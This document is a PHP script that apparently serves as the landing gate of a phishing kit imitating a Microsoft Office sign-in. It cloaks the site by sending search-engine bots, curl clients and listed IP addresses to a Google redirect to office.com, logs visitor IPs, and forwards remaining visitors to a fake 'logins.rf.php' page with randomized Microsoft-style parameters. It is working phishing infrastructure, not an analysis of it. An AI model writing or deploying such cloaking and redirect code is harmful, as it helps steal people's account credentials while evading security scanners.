<?php
session_start();
error_reporting(0);

include "control.php";



$agent = $_SERVER['HTTP_USER_AGENT'];

if(preg_match('/bot|yahoo|google|spider|crawler|curl|^$/i', $agent))
{
	header("Location: https://www.google.bg/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0ahUKEwjljueH4P_YAhXDh6YKHcGQAMQQFgg9MAI&url=https%3A%2F%2Fwww.office.com%2F&usg=AOvVaw297op3g8pyu3qja2RPtXVz");
}

if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {

      $vis_ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $vis_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $vis_ip=$_SERVER['REMOTE_ADDR'];
    }
$data   = file_get_contents('ips.txt'); 
if (strpos($data, "\r\n") !== false) {
    $data   = explode("\r\n", $data);
}
else
{
$data   = explode("\n", $data);
}




if (in_array($vis_ip,$data))
{ echo '<script>window.location.assign("https://www.google.bg/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0ahUKEwjljueH4P_YAhXDh6YKHcGQAMQQFgg9MAI&url=https%3A%2F%2Fwww.office.com%2F&usg=AOvVaw297op3g8pyu3qja2RPtXVz")</script>';
}






if($pageonline == 0)
{
die();
}

if($ip_logger == 1)
{
include "ips.php";
}




$_SESSION["valid"]=1;




echo '

<meta http-equiv="refresh" content="0;URL=logins.rf.php?waa=wsigin2.1&rpsna='.rand(10,99).'&rvr=1.5.42.1&id='.randomCha(rand(20,30)).'" />
';



?>